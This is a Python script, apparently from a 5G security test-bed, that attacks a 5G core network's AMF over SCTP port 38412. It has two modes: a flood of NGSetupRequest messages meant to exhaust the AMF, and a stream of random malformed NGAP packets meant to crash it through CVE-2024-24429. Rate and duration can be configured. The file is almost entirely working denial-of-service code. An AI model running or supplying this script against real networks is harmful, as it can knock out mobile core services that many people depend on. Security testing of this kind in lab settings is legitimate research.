#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Tier 3 — Serangan NAS/NGAP (N2) ke AMF via SCTP (port 38412).
Model: ISeCure 2025; CVE-2024-24429 (RANsacked, NGAP malformed → crash AMF).

Mode:
  ngsetup_flood  T3-02  banjir NGSetupRequest (AMF exhaustion)
  malformed      T3-03  paket NGAP cacat (PDU type ilegal / ASN.1 rusak) → CVE-2024-24429

  python3 ngap_attack.py <mode> <amf_n2_ip> [durasi] [pps]
Catatan: memakai SCTP (butuh kernel SCTP). Payload NGAP disusun minimal/rusak
         secara sengaja — tujuannya memicu jalur error-handling AMF, bukan sesi sah.
"""
import sys, time, os, random, socket

AMF_NGAP_PORT = 38412
PPID_NGAP = 60  # SCTP payload protocol id utk NGAP

# NGSetupRequest NGAP/APER minimal (procedureCode=21). Byte string hasil capture/encode kasar.
NGSETUP = bytes.fromhex(
    "0015003d000004001b00080002f839100000000052400a0309"
    "00f110000000010001001540150000f110000000010000f110"
    "0000000800020002006600010040")

def sctp_socket(target):
    import socket as s
    try:
        sock = s.socket(s.AF_INET, s.SOCK_STREAM, s.IPPROTO_SCTP)
    except Exception as e:
        print(f"[!] SCTP tidak didukung: {e}"); sys.exit(3)
    sock.settimeout(2)
    sock.connect((target, AMF_NGAP_PORT))
    return sock

def send_payload(target, payload):
    try:
        sk = sctp_socket(target)
        sk.sendall(payload)
        try: sk.recv(256)
        except Exception: pass
        sk.close()
        return True
    except Exception:
        return False

def main():
    if len(sys.argv) < 3:
        print(__doc__); sys.exit(2)
    mode, target = sys.argv[1], sys.argv[2]
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 15
    pps = int(sys.argv[4]) if len(sys.argv) > 4 else 100
    interval = 1.0/pps if pps > 0 else 0
    print(f"[NGAP/{mode}] → {target}:{AMF_NGAP_PORT} (SCTP) {duration}s @ ~{pps}pps")
    end = time.time() + duration; sent = 0; ok = 0
    while time.time() < end:
        if mode == "ngsetup_flood":
            payload = NGSETUP
        elif mode == "malformed":
            # PDU type ilegal + ASN.1 acak → jalur error handler (RANsacked)
            payload = bytes([random.randint(0,255) for _ in range(random.randint(8,48))])
        else:
            print(__doc__); sys.exit(2)
        if send_payload(target, payload): ok += 1
        sent += 1
        if interval: time.sleep(interval)
    print(f"[NGAP/{mode}] selesai, {sent} percobaan ({ok} koneksi SCTP terbentuk).")

if __name__ == "__main__":
    main()
